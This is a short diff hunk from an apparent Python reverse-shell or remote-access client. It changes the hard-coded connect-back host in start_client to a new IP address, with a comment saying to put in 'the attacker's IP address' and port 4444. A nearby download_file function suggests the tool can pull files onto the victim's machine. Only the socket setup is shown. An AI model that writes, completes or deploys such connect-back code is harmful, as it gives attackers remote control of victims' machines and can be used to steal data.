@@ -64,7 +64,7 @@ def download_file(url):
         return f"Failed to download file: {str(e)}"
 
 def start_client():
-    host = '192.168.68.118'  # Replace with the attacker's IP address
+    host = '10.20.51.15'  # Replace with the attacker's IP address
     port = 4444  # Port to connect to
 
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
